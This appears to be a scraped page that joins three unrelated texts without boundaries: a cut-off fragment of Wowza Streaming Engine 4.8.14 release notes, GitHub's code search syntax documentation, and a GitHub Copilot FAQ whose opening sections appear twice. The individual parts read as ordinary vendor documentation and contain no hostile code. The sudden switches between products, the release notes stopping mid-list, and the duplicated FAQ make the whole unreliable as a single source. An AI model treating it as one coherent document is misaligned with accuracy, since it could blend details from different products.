When using the Wowza Streaming Engine 4.8.14 installer to install a new instance of Wowza Streaming Engine on Windows, you may need to install additional dependencies in order to ingest SRT MediaCaster streams or use the generic SRT stream targets destination to publish an SRT stream. To address this, install the latest version of the [Microsoft Visual C++ Redistributable for Visual Studio](https://support.microsoft.com/en-us/help/2977003/the-latest-supported-visual-c-downloads) appropriate to your operating system.

## Breaking changes in Wowza Streaming Engine 4.8.14

---

With the sunset of MainConcept encoding and decoding for H.264 and HEVC/H.265 video, some common advanced MainConcept parameters are automatically mapped to Beamr equivalents, with values also automatically adjusted as needed. However, advanced MainConcept parameters for H.264 and HEVC/H.265 video that are not automatically mapped will not continue to work with Wowza Streaming Engine 4.8.14. Access logs (wowzastreamingengine\_access.log) report these parameters with a warning. For example:

WARN 200 - TranscoderNativeParameterInfo.mapEncodingParameter: MainConcept encoding parameter [mainconcept.entropy\_coding\_mode=1] not supported by Beamr4 and won't be applied

If your configuration includes advanced MainConcept encoding parameters that are not automatically mapped, you need to update your encoding configuration for Beamr (decoding parameters for Beamr are not available).

## Detailed list of changes in Wowza Streaming Engine 4.8.14

---

#### Changes since Wowza Streaming Engine 4.8.13

* Upgraded CUDA support to CUDA 11. For NVIDIA hardware acceleration, the NVIDIA microarchitecture of your hardware must support CUDA 11, and using NVIDIA driver version 460.00 or later is required.
  + Sunset support for Kepler GPUs. See the [Deprecated and Dropped Features](https://docs.nvidia.com/cuda/archive/11.0/cuda-toolkit-release-notes/#deprecated-features) section in the CUDA 11.0.3 Release Notes for more information.
  + Sunset support for CUDA decoding. For NVIDIA accelerated decoding, use the NVCUVID (also known as NVDEC) implementation instead.
* Sunset support for MainConcept H.264 and HEVC/H.265 video encoding and decoding.
  + Updated the Default encoding and decoding implementation for H.264 and HEVC/H.265 video to use Beamr instead of MainConcept. Existing Transcoder templates that use Default as the encoding or decoding implementation will use Beamr after updating.
  + Mapped the following advanced MainConcept encoding parameters to Beamr equivalents for H.264, with values automatically adjusted as needed.
    - mainconcept.bit\_rate > beamr4.kbps
    - mainconcept.bit\_rate\_mode > beamr4.rc\_type
    - mainconcept.idr\_interval > beamr4.keyframes
    - mainconcept.level\_id > beamr4.level\_idc

# Understanding GitHub Code Search syntax

You can build search queries for the results you want with specialized code qualifiers, regular expressions, and boolean operations.

## In this article

* [About code search query structure](#about-code-search-query-structure)
* [Query for an exact match](#query-for-an-exact-match)
* [Searching for quotes and backslashes](#searching-for-quotes-and-backslashes)
* [Using boolean operations](#using-boolean-operations)
* [Using qualifiers](#using-qualifiers)
* [Using regular expressions](#using-regular-expressions)
* [Separating search terms](#separating-search-terms)
* [Case sensitivity](#case-sensitivity)
## [About code search query structure](#about-code-search-query-structure)

The search syntax in this article only applies to searching code with GitHub code search. Note that the syntax and qualifiers for searching for non-code content, such as issues, users, and discussions, is not the same as the syntax for code search. For more information on non-code search, see [About searching on GitHub](/en/search-github/getting-started-with-searching-on-github/about-searching-on-github) and [Searching on GitHub](/en/search-github/searching-on-github).

Search queries consist of search terms, comprising text you want to search for, and qualifiers, which narrow down the search.

A bare term with no qualifiers will match either the content of a file or the file's path.

For example, the following query:

```
http-push

```

The above query will match the file `docs/http-push.txt`, even if it doesn't contain the term `http-push`. It will also match a file called `example.txt` if it contains the term `http-push`.

You can enter multiple terms separated by whitespace to search for documents that satisfy both terms.

For example, the following query:

```
sparse index

```

The search results would include all documents containing both the terms `sparse` and `index`, in any order. As examples, it would match a file containing `SparseIndexVector`, a file with the phrase `index for sparse trees`, and even a file named `index.txt` that contains the term `sparse`.

Searching for multiple terms separated by whitespace is the equivalent to the search `hello AND world`. Other boolean operations, such as `hello OR world`, are also supported. For more information about boolean operations, see [Using boolean operations](#using-boolean-operations).

Code search also supports searching for an exact string, including whitespace. For more information, see [Query for an exact match](#query-for-an-exact-match).

You can narrow your code search with specialized qualifiers, such as `repo:`, `language:` and `path:`. For more information on the qualifiers you can use in code search, see [Using qualifiers](#using-qualifiers).

You can also use regular expressions in your searches by surrounding the expression in slashes. For more information on using regular expressions, see [Using regular expressions](#using-regular-expressions).

## [Query for an exact match](#query-for-an-exact-match)

To search for an exact string, including whitespace, you can surround the string in quotes. For example:

```
"sparse index"

```

You can also use quoted strings in qualifiers, for example:

```
path:git language:"protocol buffers"

```
## [Searching for quotes and backslashes](#searching-for-quotes-and-backslashes)

To search for code containing a quotation mark, you can escape the quotation mark using a backslash. For example, to find the exact string `name = "tensorflow"`, you can search:

```
"name = \"tensorflow\""

```

To search for code containing a backslash, `\`, use a double backslash, `\\`.

The two escape sequences `\\` and `\"` can be used outside of quotes as well. No other escape sequences are recognized, though. A backslash that isn't followed by either `"` or `\` is included in the search, unchanged.

Additional escape sequences, such as `\n` to match a newline character, are supported in regular expressions. See [Using regular expressions](#using-regular-expressions).

## [Using boolean operations](#using-boolean-operations)

Code search supports boolean expressions. You can use the operators `AND`, `OR`, and `NOT` to combine search terms.

By default, adjacent terms separated by whitespace are equivalent to using the `AND` operator. For example, the search query `sparse index` is the same as `sparse AND index`, meaning that the search results will include all documents containing both the terms `sparse` and `index`, in any order.

To search for documents containing either one term or the other, you can use the `OR` operator. For example, the following query will match documents containing either `sparse` or `index`:

```
sparse OR index

```

To exclude files from your search results, you can use the `NOT` operator. For example, to exclude files in the `__testing__` directory, you can search:

```
"fatal error" NOT path:__testing__

```

You can use parentheses to express more complicated boolean expressions. For example:

```
(language:ruby OR language:python) AND NOT path:"/tests/"

```
## [Using qualifiers](#using-qualifiers)

You can use specialized keywords to qualify your search.

* [Repository qualifier](#repository-qualifier)
* [Organization and user qualifiers](#organization-and-user-qualifiers)
* [Language qualifier](#language-qualifier)
* [Path qualifier](#path-qualifier)
* [Symbol qualifier](#symbol-qualifier)
* [Content qualifier](#content-qualifier)
* [Is qualifier](#is-qualifier)

### [Repository qualifier](#repository-qualifier)

To search within a repository, use the `repo:` qualifier. You must provide the full repository name, including the owner. For example:

```
repo:github-linguist/linguist

```

To search within a set of repositories, you can combine multiple `repo:` qualifiers with the boolean operator `OR`. For example:

```
repo:github-linguist/linguist OR repo:tree-sitter/tree-sitter

```

Note

Code search does not currently support regular expressions or partial matching for repository names, so you will have to type the entire repository name (including the user prefix) for the `repo:` qualifier to work.

### [Organization and user qualifiers](#organization-and-user-qualifiers)

To search for files within an organization, use the `org:` qualifier. For example:

```
org:github

```

To search for files within a personal account, use the `user:` qualifier. For example:

```
user:octocat

```

Note

Code search does not currently support regular expressions or partial matching for organization or user names, so you will have to type the entire organization or user name for the qualifier to work.

### [Language qualifier](#language-qualifier)

To narrow down to a specific languages, use the `language:` qualifier. For example:

```
language:ruby OR language:cpp OR language:csharp

```

For a complete list of supported language names, see [languages.yaml](https://github.com/github-linguist/linguist/blob/main/lib/linguist/languages.yml) in [github-linguist/linguist](https://github.com/github-linguist/linguist). If your preferred language is not on the list, you can open a pull request to add it.

### [Path qualifier](#path-qualifier)

To search within file paths, use the `path:` qualifier. This will match files containing the term anywhere in their file path. For example, to find files containing the term `unit_tests` in their path, use:

```
path:unit_tests

```

The above query will match both `src/unit_tests/my_test.py` and `src/docs/unit_tests.md` since they both contain `unit_test` somewhere in their path.

To match only a specific filename (and not part of the path), you could use a regular expression:

```
path:/(^|\/)README\.md$/

```

Note that the `.` in the filename is escaped, since `.` has special meaning for regular expressions. For more information about using regular expressions, see [Using regular expressions](#using-regular-expressions).

You can also use some limited glob expressions in the `path:` qualifier.

For example, to search for files with the extension `txt`, you can use:

```
path:*.txt

```

To search for JavaScript files within a `src` directory, you could use:
```
path:src/*.js

```

* By default, glob expressions are not anchored to the start of the path, so the above expression would still match a path like `app/src/main.js`. But if you prefix the expression with `/`, it will anchor to the start. For example:

  ```
  path:/src/*.js

  ```
* Note that `*` doesn't match the `/` character, so for the above example, all results will be direct descendants of the `src` directory. To match within subdirectories, so that results include deeply nested files such as `/src/app/testing/utils/example.js`, you can use `**`. For example:

  ```
  path:/src/**/*.js

  ```

You can also use the `?` global character. For example, to match the path `file.aac` or `file.abc`, you can use:

```
path:*.a?c

```

To search for a filename which contains a special character like `\*` or `?`, just use a quoted string:
```
path:"file?"

```

Glob expressions are disabled for quoted strings, so the above query will only match paths containing the literal string `file?`.

### [Symbol qualifier](#symbol-qualifier)

You can search for symbol definitions in code, such as function or class definitions, using the `symbol:` qualifier. Symbol search is based on parsing your code using the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, so no extra setup or build tool integration is required.

For example, to search for a symbol called `WithContext`:

```
language:go symbol:WithContext

```

In some languages, you can search for symbols using a prefix (e.g. a prefix of their class name). For example, for a method `deleteRows` on a struct `Maint`, you could search `symbol:Maint.deleteRows` if you are using Go, or `symbol:Maint::deleteRows` in Rust.

You can also use regular expressions with the symbol qualifier. For example, the following query would find conversions people have implemented in Rust for the `String` type:

```
language:rust symbol:/^String::to_.*/

```

Note that this qualifier only searches for definitions and not references, and not all symbol types or languages are fully supported yet. Symbol extraction is supported for the following languages:

* Bash
* C
* C#
* C++
* CodeQL
* Elixir
* Go
* JSX
* Java
* JavaScript
* Lua
* PHP
* Protocol Buffers
* Python
* R
* Ruby
* Rust
* Scala
* Starlark
* Swift
* Typescript

We are working on adding support for more languages. If you would like to help contribute to this effort, you can add support for your language in the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, upon which symbol search is based.

### [Content qualifier](#content-qualifier)

By default, bare terms search both paths and file content. To restrict a search to strictly match the content of a file and not file paths, use the `content:` qualifier. For example:

```
content:README.md

```

This query would only match files containing the term `README.md`, rather than matching files named `README.md`.

### [Is qualifier](#is-qualifier)

To filter based on repository properties, you can use the `is:` qualifier. `is:` supports the following values:

* `archived`: restricts the search to archived repositories.
* `fork`: restricts the search to forked repositories.
* `vendored`: restricts the search to content detected as vendored.
* `generated`: restricts the search to content detected as generated.

For example:

```
path:/^MIT.txt$/ is:archived

```

Note that the `is:` qualifier can be inverted with the `NOT` operator. To search for non-archived repositories, you can search:

```
log4j NOT is:archived

```

To exclude forks from your results, you can search:

```
log4j NOT is:fork

```
## [Using regular expressions](#using-regular-expressions)

Code search supports regular expressions to search for patterns in your code. You can use regular expressions in bare search terms as well as within many qualifiers, by surrounding the regex in slashes.

For example, to search for the regular expression `sparse.*index`, you would use:

```
/sparse.*index/

```

Note that you'll have to escape any forward slashes within the regular expression. For example, to search for files within the `App/src` directory, you would use:

```
/^App\/src\//

```

Inside a regular expression, `\n` stands for a newline character, `\t` stands for a tab, and `\x{hhhh}` can be used to escape any Unicode character. This means you can use regular expressions to search for exact strings that contain characters that you can't type into the search bar.

Most common regular expressions features work in code search. However, "look-around" assertions are not supported.

## [Separating search terms](#separating-search-terms)

All parts of a search, such as search terms, exact strings, regular expressions, qualifiers, parentheses, and the boolean keywords `AND`, `OR`, and `NOT`, must be separated from one another with spaces. The one exception is that items inside parentheses, `(` `)`, don't need to be separated from the parentheses.

If your search contains multiple components that aren't separated by spaces, or other text that does not follow the rules listed above, code search will try to guess what you mean. It often falls back on treating that component of your query as the exact text to search for. For example, the following query:

```
printf("hello world\n");

```

Code search will give up on interpreting the parentheses and quotes as special characters and will instead search for files containing that exact code.

If code search guesses wrong, you can always get the search you wanted by using quotes and spaces to make the meaning clear.

## [Case sensitivity](#case-sensitivity)

By default, code search is case-insensitive, and results will include both uppercase and lowercase results. You can do case-sensitive searches by using a regular expression with case insensitivity turned off. For example, to search for the string "True", you would use:

```
/(?-i)True/

```

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

#### What if I do not want Copilot?

Copilot is entirely optional and requires you to opt in before gaining access. You can easily configure its usage directly in the editor, enabling or disabling it at any time. Additionally, you have control over which file types Copilot is active for.

#### How do I control access to Copilot in my company?

Access to Copilot Business and Enterprise is managed by your GitHub Administrator. They can control access to preview features, models, and set Copilot policies for your organization. Additionally, you can use your network firewall to explicitly allow access to Copilot Business and/or block access to Copilot Pro or Free. For more details, refer to the [documentation](https://docs.github.com/en/copilot/managing-copilot/managing-github-copilot-in-your-organization/managing-access-to-github-copilot-in-your-organization).

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in GitHub Advanced Security and available to all public repositories.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

GeneralPlans & PricingPrivacyResponsible AI
### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
